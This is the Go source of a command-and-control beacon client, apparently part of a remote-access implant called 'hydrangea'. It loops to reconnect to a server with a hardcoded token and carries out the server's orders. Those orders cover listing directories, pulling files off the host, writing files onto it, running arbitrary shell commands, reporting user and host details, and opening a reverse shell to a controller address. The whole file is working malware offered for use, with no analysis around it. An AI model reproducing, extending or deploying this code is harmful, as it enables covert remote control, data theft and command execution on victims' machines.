// client/go/main.go
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var (
	// Injected via -ldflags -X (see serverctl build-client)
	DefaultServerHost = "127.0.0.1"
	DefaultServerPort = "9000"
	DefaultAuthToken  = "supersecret"
	DefaultClientID   = "default-hydrangea-beacon"
)

type Header map[string]any

func writeFrame(conn net.Conn, hdr Header, payload []byte) error {
	if payload == nil {
		payload = []byte{}
	}
	h := Header{}
	for k, v := range hdr {
		h[k] = v
	}
	h["size"] = len(payload)
	hb, err := json.Marshal(h)
	if err != nil {
		return err
	}
	var lenbuf [4]byte
	binary.BigEndian.PutUint32(lenbuf[:], uint32(len(hb)))
	if _, err = conn.Write(lenbuf[:]); err != nil {
		return err
	}
	if _, err = conn.Write(hb); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err = conn.Write(payload)
	}
	return err
}

func readN(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func readFrame(conn net.Conn) (Header, []byte, error) {
	hlenb, err := readN(conn, 4)
	if err != nil {
		return nil, nil, err
	}
	hlen := int(binary.BigEndian.Uint32(hlenb))
	hb, err := readN(conn, hlen)
	if err != nil {
		return nil, nil, err
	}
	var hdr Header
	if err := json.Unmarshal(hb, &hdr); err != nil {
		return nil, nil, err
	}
	size := 0
	switch v := hdr["size"].(type) {
	case float64:
		size = int(v)
	case string:
		size, _ = strconv.Atoi(v)
	}
	var payload []byte
	if size > 0 {
		payload, err = readN(conn, size)
		if err != nil {
			return nil, nil, err
		}
	}
	return hdr, payload, nil
}

// ---------- path helpers ----------

func safeJoin(root string, p string) (string, error) {
	if p == "" {
		p = "."
	}
	if filepath.IsAbs(p) {
		return filepath.Clean(p), nil
	}
	if root == "" {
		return "", errors.New("relative path without root")
	}
	full := filepath.Join(root, p)
	full = filepath.Clean(full)
	base := filepath.Clean(root)
	sep := string(os.PathSeparator)
	if !strings.HasPrefix(full+sep, base+sep) && full != base {
		return "", errors.New("path traversal detected")
	}
	return full, nil
}

// ---------- order handlers ----------

func handlePing(conn net.Conn) {
	_ = writeFrame(conn, Header{"type": "PONG"}, nil)
}

func handleList(conn net.Conn, root string, hdr Header) {
	path, _ := hdr["path"].(string)
	reqID, _ := hdr["req_id"].(string)

	target, err := safeJoin(root, path)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
		return
	}

	dir, err := os.ReadDir(target)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("LIST_DIR failed: %v", err)}, nil)
		return
	}
	type entry struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Bytes int64  `json:"bytes"`
		Mtime int64  `json:"mtime"`
	}
	ents := make([]entry, 0, len(dir))
	for _, de := range dir {
		info, err := de.Info()
		if err != nil {
			continue
		}
		ents = append(ents, entry{
			Name:  de.Name(),
			IsDir: de.IsDir(),
			Bytes: info.Size(),
			Mtime: info.ModTime().Unix(),
		})
	}
	payload, _ := json.Marshal(ents)
	h := Header{"type": "RESULT_LIST_DIR"}
	if reqID != "" {
		h["req_id"] = reqID
	}
	h["path"] = path
	h["entries_count"] = len(ents)
	_ = writeFrame(conn, h, payload)
}

func handlePullFile(conn net.Conn, root string, hdr Header) {
	src, _ := hdr["src"].(string)
	saveAs, _ := hdr["save_as"].(string)
	if src == "" {
		_ = writeFrame(conn, Header{"type": "LOG", "message": "PULL_FILE missing src"}, nil)
		return
	}
	full, err := safeJoin(root, src)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE failed: %v", err)}, nil)
		return
	}
	data, err := os.ReadFile(full)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PULL_FILE read: %v", err)}, nil)
		return
	}
	sum := sha256.Sum256(data)
	h := Header{
		"type":     "FILE",
		"src_path": src,
		"save_as":  saveAs,
		"sha256":   fmt.Sprintf("%x", sum[:]),
	}
	_ = writeFrame(conn, h, data)
}

func handlePushFile(conn net.Conn, root string, hdr Header, payload []byte) {
	dest, _ := hdr["dest"].(string)
	if dest == "" {
		return
	}
	full, err := safeJoin(root, dest)
	if err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE failed: %v", err)}, nil)
		return
	}
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE mkdir: %v", err)}, nil)
		return
	}
	if err := os.WriteFile(full, payload, 0o644); err != nil {
		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE write: %v", err)}, nil)
		return
	}
	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("PUSH_FILE ok -> %s", full)}, nil)
}

func handleExec(conn net.Conn, root string, hdr Header) {
	reqID, _ := hdr["req_id"].(string)
	timeoutSec := 30.0
	if t, ok := hdr["timeout"].(float64); ok {
		timeoutSec = t
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec*float64(time.Second)))
	defer cancel()

	var shell bool
	if b, ok := hdr["shell"].(bool); ok {
		shell = b
	}

	var cwd string
	if s, ok := hdr["cwd"].(string); ok {
		cwd = s
	}

	var cmd *exec.Cmd
	if shell {
		// command must be string
		cstr, _ := hdr["cmd"].(string)
		if runtime.GOOS == "windows" {
			cmd = exec.CommandContext(ctx, "cmd.exe", "/C", cstr)
		} else {
			cmd = exec.CommandContext(ctx, "/bin/sh", "-lc", cstr)
		}
	} else {
		// either string -> split, or [] -> list
		if lst, ok := hdr["cmd"].([]any); ok && len(lst) > 0 {
			argv := make([]string, 0, len(lst))
			for _, v := range lst {
				argv = append(argv, fmt.Sprint(v))
			}
			cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
		} else {
			cstr, _ := hdr["cmd"].(string)
			parts := strings.Fields(cstr)
			if len(parts) == 0 {
				_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(`{"rc":null,"stdout":"","stderr":"empty command"}`))
				return
			}
			cmd = exec.CommandContext(ctx, parts[0], parts[1:]...)
		}
	}

	if cwd != "" {
		if full, err := safeJoin(root, cwd); err == nil {
			cmd.Dir = full
		}
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	rc := 0
	if err := cmd.Start(); err != nil {
		rc = -1
		_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(fmt.Sprintf(`{"rc":%d,"stdout":"","stderr":%q}`, rc, err.Error())))
		return
	}
	waitErr := cmd.Wait()
	if waitErr != nil {
		rc = -1
		if exitErr, ok := waitErr.(*exec.ExitError); ok {
			if status, ok := exitErr.Sys().(syscall.WaitStatus); ok {
				rc = status.ExitStatus()
			}
		}
	}
	result := fmt.Sprintf(
		`{"rc":%d,"stdout":%q,"stderr":%q}`,
		rc, stdout.String(), stderr.String(),
	)
	_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(result))
}

func handleSession(conn net.Conn, root string, _ Header) {
	u, _ := user.Current()
	host, _ := os.Hostname()
	cwd, _ := os.Getwd()
	info := map[string]any{
		"platform":   runtime.GOOS + "-" + runtime.GOARCH,
		"system":     runtime.GOOS,
		"release":    runtime.Version(),
		"version":    runtime.Version(),
		"machine":    runtime.GOARCH,
		"processor":  runtime.GOARCH,
		"runtime":    runtime.Version(),
		"pid":        os.Getpid(),
		"user":       func() string { if u != nil { return u.Username }; return "" }(),
		"cwd":        cwd,
		"hostname":   host,
		"root":       root,
		"executable": os.Args[0],
	}
	payload, _ := json.Marshal(info)
	_ = writeFrame(conn, Header{"type": "RESULT_SESSION_INFO"}, payload)
}

// Reverse shell: start it in background, never block the C2 goroutine,
// and never write to the C2 socket from the background goroutine.
func handleReverseShell(conn net.Conn, _root string, hdr Header) {
	controllerAddr, _ := hdr["controller_addr"].(string)
	if controllerAddr == "" {
		_ = writeFrame(conn, Header{"type": "LOG", "message": "REVERSE_SHELL failed: controller address missing"}, nil)
		return
	}

	// Log once and return immediately so main loop remains responsive.
	_ = writeFrame(conn, Header{
		"type":    "LOG",
		"message": fmt.Sprintf("REVERSE_SHELL: launching background connector to %s", controllerAddr),
	}, nil)

	// Background goroutine. Do NOT touch the C2 socket here.
	go func(addr string) {
		rsock, err := net.Dial("tcp", addr)
		if err != nil {
			// Avoid writing LOG back on the C2 socket from here.
			return
		}
		defer rsock.Close()

		// Delegate to OS-specific spawner (implemented in revshell_*.go via build tags).
		_ = spawnReverseShell(rsock)
	}(controllerAddr)
}

// ---------- main loop ----------

func main() {
	server := flag.String("server", DefaultServerHost, "Server IP/host")
	port := flag.Int("port", func() int { p, _ := strconv.Atoi(DefaultServerPort); if p == 0 { p = 9000 }; return p }(), "Server port")
	token := flag.String("auth-token", DefaultAuthToken, "Auth token")
	clientID := flag.String("client-id", DefaultClientID, "Client ID (default: hostname)")
	root := flag.String("root", "/", "Base directory for relative paths")
	flag.Parse()

	id := *clientID
	if id == "" {
		if h, err := os.Hostname(); err == nil {
			id = h
		} else {
			id = "client"
		}
	}

	addr := fmt.Sprintf("%s:%d", *server, *port)
	for {
		if err := runOnce(addr, id, *token, *root); err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		time.Sleep(1 * time.Second)
	}
}

func runOnce(addr, clientID, token, root string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	defer conn.Close()

	// register
	if err := writeFrame(conn, Header{"type": "REGISTER", "client_id": clientID, "token": token}, nil); err != nil {
		return err
	}

	for {
		hdr, payload, err := readFrame(conn)
		if err != nil {
			return err
		}
		switch hdr["type"] {
		case "PING":
			handlePing(conn)
		case "LIST_DIR":
			handleList(conn, root, hdr)
		case "PULL_FILE":
			handlePullFile(conn, root, hdr)
		case "PUSH_FILE":
			handlePushFile(conn, root, hdr, payload)
		case "EXEC":
			handleExec(conn, root, hdr)
		case "SESSION_INFO":
			handleSession(conn, root, hdr)
		case "REVERSE_SHELL":
			handleReverseShell(conn, root, hdr)
		default:
			// ignore unknown
		}
	}
}
